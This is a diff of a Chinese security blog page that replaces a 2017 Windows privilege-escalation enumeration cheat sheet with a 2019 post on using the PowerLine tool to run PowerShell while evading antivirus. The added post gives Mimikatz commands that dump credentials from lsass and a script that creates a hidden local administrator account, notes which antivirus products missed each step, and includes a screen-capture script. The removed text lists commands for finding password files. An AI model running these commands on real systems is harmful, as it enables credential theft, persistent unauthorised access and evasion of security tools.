@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="提权," />
+  <meta name="keywords" content="渗透测试,PowerShell," />
 
 
 
@@ -88,31 +88,29 @@
 
 
 
-<meta name="description" content="0x01 获取操作系统信息
-识别操作系统名称及版本
-12systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;
-
-识别系统体系结构
-1echo %PROCESSOR_ARCHITE">
+<meta name="description" content="在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。
+0x01 PowerLine下载链接">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows权限提升基础">
-<meta property="og:url" content="https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html">
+<meta property="og:title" content="PowerShell之PowerLine.md">
+<meta property="og:url" content="https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html">
 <meta property="og:site_name" content="Hello_C技术博客">
-<meta property="og:description" content="0x01 获取操作系统信息
-识别操作系统名称及版本
-12systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;
-
-识别系统体系结构
-1echo %PROCESSOR_ARCHITE">
-<meta property="og:updated_time" content="2017-05-30T04:40:16.000Z">
+<meta property="og:description" content="在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。
+0x01 PowerLine下载链接">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/3KVLXle27nY8C4j.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/V9tH5K6ZWXuBzno.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/xYLQa3GU9bpXVh2.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/tRVD7mwgBhxfYsI.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/5frOU43nNHxCBPR.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/dMlVaJAOWSi9cqz.png">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/oeIK7PCfT21wtYD.gif">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/owPbxh2tfWgX5pH.gif">
+<meta property="og:image" content="https://i.loli.net/2019/12/24/rAxiDIX3fvkyPNB.gif">
+<meta property="og:updated_time" content="2019-12-24T13:43:26.711Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows权限提升基础">
-<meta name="twitter:description" content="0x01 获取操作系统信息
-识别操作系统名称及版本
-12systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;
-
-识别系统体系结构
-1echo %PROCESSOR_ARCHITE">
+<meta name="twitter:title" content="PowerShell之PowerLine.md">
+<meta name="twitter:description" content="在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。
+0x01 PowerLine下载链接">
+<meta name="twitter:image" content="https://i.loli.net/2019/12/24/3KVLXle27nY8C4j.png">
 
 
 
@@ -142,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html"/>
+  <link rel="canonical" href="https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html"/>
 
 
 
 
 
-  <title>windows权限提升基础 | Hello_C技术博客</title>
+  <title>PowerShell之PowerLine.md | Hello_C技术博客</title>
   
 
 
@@ -285,7 +283,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html">
+    <link itemprop="mainEntityOfPage" href="https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hello_C">
@@ -302,7 +300,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">windows权限提升基础</h1>
+          <h1 class="post-title" itemprop="name headline">PowerShell之PowerLine.md</h1>
         
 
         <div class="post-meta">
@@ -314,8 +312,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-19T21:50:40+08:00">
-                2017-05-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-24T21:36:43+08:00">
+                2019-12-24
               </time>
             
 
@@ -355,8 +353,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/渗透/2017/05/19/windows权限提升基础.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2017/05/19/windows权限提升基础.html" itemprop="commentCount"></span>
+                <a href="/渗透/2019/12/24/PowerShell之PowerLine.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2019/12/24/PowerShell之PowerLine.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -384,82 +382,16 @@
       
 
       
-        <h3 id="0x01-获取操作系统信息"><a href="#0x01-获取操作系统信息" class="headerlink" title="0x01 获取操作系统信息"></a>0x01 获取操作系统信息</h3><ul>
-<li><p>识别操作系统名称及版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div></pre></td></tr></table></figure>
-</li>
-<li><p>识别系统体系结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo %PROCESSOR_ARCHITECTURE%</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<a id="more"></a>
-<ul>
-<li><p>查看所有环境变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看在线用户，有时候低权限看不到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query user</div></pre></td></tr></table></figure>
-</li>
-<li><p>查询终端端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看某特定用户信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user test</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="0x02-获取网络信息"><a href="#0x02-获取网络信息" class="headerlink" title="0x02 获取网络信息"></a>0x02 获取网络信息</h3><ul>
-<li><p>查看路由表信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route print</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看ARP缓存信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arp -a</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看网络连接和防火墙规则</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div><div class="line">netsh firewall show config</div><div class="line">netsh firewall show state</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="0x03-应用程序及服务信息"><a href="#0x03-应用程序及服务信息" class="headerlink" title="0x03 应用程序及服务信息"></a>0x03 应用程序及服务信息</h3><ul>
-<li><p>查看计划任务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /QUERY /fo LIST /v</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看服务进程ID</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tasklist /SVC</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看已经启动Windows 服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看安装驱动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DRIVERQUERY</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看安装程序和版本信息（漏洞利用线索）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product list brief</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看服务、进程和启动程序信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div><div class="line">wmic process list brief</div><div class="line">wmic startup list brief</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看服务权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc mysqla</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看安装补丁和时间信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
-</li>
-<li><p>查看特定漏洞补丁信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="0x04-敏感数据和目录"><a href="#0x04-敏感数据和目录" class="headerlink" title="0x04 敏感数据和目录"></a>0x04 敏感数据和目录</h3><ul>
-<li>查找密码文件或其它敏感文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cd/</div><div class="line">dir /b/s password.txt # Will search for all password.txt files on the filesystem.</div><div class="line">dir /b/s config.* # Will search for all files starting with &apos;config&apos; on the filesystem.</div><div class="line">findstr /si password *.xml *.ini *.txt</div><div class="line">findstr /si login *.xml *.ini *.txt</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05 文件系统"></a>0x05 文件系统</h3><ul>
-<li><p>打包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rar a -k -r -s -m3 c:\1.rar c:\folde</div></pre></td></tr></table></figure>
-</li>
-<li><p>检查文件夹可写状态</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir /a-r-d /s /b</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>参考：<a href="http://www.goldfire.cc/index.php/archives/660" target="_blank" rel="external">http://www.goldfire.cc/index.php/archives/660</a></p>
+        <p>　　在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。</p>
+<h2 id="0x01-PowerLine"><a href="#0x01-PowerLine" class="headerlink" title="0x01 PowerLine"></a>0x01 PowerLine</h2><p><a href="https://github.com/fullmetalcache/PowerLine" target="_blank" rel="external">下载链接</a><a id="more"></a><br><img src="https://i.loli.net/2019/12/24/3KVLXle27nY8C4j.png" alt="1.png"><br><strong>优点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、快速安装、编译、运行，不需要安装Visual Studio PowerShell</div><div class="line">2、对加载的powershell脚本进行编码绕过</div><div class="line">3、执行编译好的exe，脚本在内存中运行</div></pre></td></tr></table></figure></p>
+<p><strong>缺点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、需要对目标系统版本号了解，本地搭建相同环境编译</div><div class="line">2、运行需要按照powershell执行方式</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-安装、编译"><a href="#0x02-安装、编译" class="headerlink" title="0x02 安装、编译"></a>0x02 安装、编译</h2><p>整个代码框架如下，脚本家在加载配置文件为<strong>UserConf.xml</strong>。<br><img src="https://i.loli.net/2019/12/24/V9tH5K6ZWXuBzno.png" alt="2.png"><br>使用过程如下：<br>1、运行build.bat<br><img src="https://i.loli.net/2019/12/24/xYLQa3GU9bpXVh2.png" alt="3.png"><br>2、配置UserConf.xml文件，修改为需要远程加载编译的URL，自己本地的话把写好的powershell放到自己起的web里面就行。<br><img src="https://i.loli.net/2019/12/24/tRVD7mwgBhxfYsI.png" alt="4.png"><br>3、运行PLBuilder.exe，回根据运行的系统版本编译成对应的exe<br><img src="https://i.loli.net/2019/12/24/5frOU43nNHxCBPR.png" alt="5.png"><br>整个流程就这简单的三步，会在目录下生成1个PowerLine.exe，7个常见的ps脚本已经编译在里面了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PowerLine.exe -ShowScripts //显示嵌入的脚本</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/dMlVaJAOWSi9cqz.png" alt="6.png"><br>之后可以根据每个脚本的使用命令执行相关的操作。</p>
+<h2 id="0x03-后渗透"><a href="#0x03-后渗透" class="headerlink" title="0x03 后渗透"></a>0x03 后渗透</h2><p><strong>1、Minikatz</strong><br>普通的Minikatz已经被各大杀软查杀，都修改源码重新编译进行绕过，使用PowerLine加载Minikatz.ps也可以绕过一些免杀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//dump lsass.exe </div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;privilege::debug`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div><div class="line">//dump lsass.exe 为dmp</div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;sekurlsa::minidump lsass_dump_name.dmp`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/oeIK7PCfT21wtYD.gif" alt="7.gif"><br>直接dump密码这种360可以检测到了，其他2款没有检测到。<br><strong>2、添加用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">For($i=0;$i -lt $args.Count; $i++)</div><div class="line">&#123;</div><div class="line">    $User = $($args[0]);</div><div class="line">	$Passwd = $($args[1]);</div><div class="line">&#125;</div><div class="line">$Computer = [ADSI]&quot;WinNT://$Env:COMPUTERNAME,Computer&quot;;</div><div class="line">$CompStat = Get-WmiObject win32_computersystem;</div><div class="line">$Computer2 = $CompStat.Name;</div><div class="line">$LocalAdmin = $Computer.Create(&quot;User&quot;, $User);</div><div class="line">$LocalAdmin.SetPassword($Passwd);</div><div class="line">$LocalAdmin.SetInfo();</div><div class="line">$group = [ADSI](&apos;WinNT://&apos; + $Computer2 + &apos;/Administrators,group&apos;);</div><div class="line">$adduser = (&quot;WinNT://&quot; + $Computer2 + &quot;/&quot; + $User);</div><div class="line">$group.add($adduser);</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/owPbxh2tfWgX5pH.gif" alt="8.gif"><br>几款杀软都没有检测到。<br><strong>3、截图</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">function Get-ScreenCapture</div><div class="line">&#123;</div><div class="line">    param(    </div><div class="line">    [Switch]$OfWindow        </div><div class="line">    )</div><div class="line"></div><div class="line"></div><div class="line">    begin &#123;</div><div class="line">        Add-Type -AssemblyName System.Drawing</div><div class="line">        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | </div><div class="line">            Where-Object &#123; $_.FormatDescription -eq &quot;JPEG&quot; &#125;</div><div class="line">    &#125;</div><div class="line">    process &#123;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        if ($OfWindow) &#123;            </div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;%&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125; else &#123;</div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        $bitmap = [Windows.Forms.Clipboard]::GetImage()    </div><div class="line">        $ep = New-Object Drawing.Imaging.EncoderParameters  </div><div class="line">        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  </div><div class="line">        $screenCapturePathBase = &quot;$pwd\ScreenCapture&quot;</div><div class="line">        $c = 0</div><div class="line">        while (Test-Path &quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;) &#123;</div><div class="line">            $c++</div><div class="line">        &#125;</div><div class="line">        $bitmap.Save(&quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;, $jpegCodec, $ep)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/rAxiDIX3fvkyPNB.gif" alt="9.gif"></p>
+<p>　　这里只是尝试了常见的后渗透利用方法，利用powershell后渗透还是很有成效。大家可以使用PS实现其他功能。虽然现在不杀，不一定之后还能用，且用且珍惜。</p>
 
       
     </div>
@@ -480,7 +412,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html" title="windows权限提升基础">https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html</a>
+    <a href="https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html" title="PowerShell之PowerLine.md">https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -495,7 +427,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/提权/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/PowerShell/" rel="tag"><i class="fa fa-tag"></i> PowerShell</a>
           
         </div>
       
@@ -508,8 +442,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/渗透/2017/05/18/一次基于Linux的渗透测试.html" rel="next" title="一次基于Linux的渗透测试">
-                <i class="fa fa-chevron-left"></i> 一次基于Linux的渗透测试
+              <a href="/渗透/2019/07/08/内网中的端口扫描.html" rel="next" title="内网中的端口扫描">
+                <i class="fa fa-chevron-left"></i> 内网中的端口扫描
               </a>
             
           </div>
@@ -517,10 +451,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/渗透/2017/06/16/转-黑客入侵应急分析手工排查.html" rel="prev" title="[转]黑客入侵应急分析手工排查">
-                [转]黑客入侵应急分析手工排查 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -589,8 +519,8 @@
 
   
     <div class="comments" id="comments">
-      <div class="ds-thread" data-thread-key="渗透/2017/05/19/windows权限提升基础.html"
-           data-title="windows权限提升基础" data-url="https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html">
+      <div class="ds-thread" data-thread-key="渗透/2019/12/24/PowerShell之PowerLine.html"
+           data-title="PowerShell之PowerLine.md" data-url="https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html">
       </div>
     </div>
 
@@ -780,7 +710,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-获取操作系统信息"><span class="nav-number">1.</span> <span class="nav-text">0x01 获取操作系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-获取网络信息"><span class="nav-number">2.</span> <span class="nav-text">0x02 获取网络信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-应用程序及服务信息"><span class="nav-number">3.</span> <span class="nav-text">0x03 应用程序及服务信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-敏感数据和目录"><span class="nav-number">4.</span> <span class="nav-text">0x04 敏感数据和目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-文件系统"><span class="nav-number">5.</span> <span class="nav-text">0x05 文件系统</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PowerLine"><span class="nav-number">1.</span> <span class="nav-text">0x01 PowerLine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-安装、编译"><span class="nav-number">2.</span> <span class="nav-text">0x02 安装、编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-后渗透"><span class="nav-number">3.</span> <span class="nav-text">0x03 后渗透</span></a></li></ol></div>
             
 
           </div>
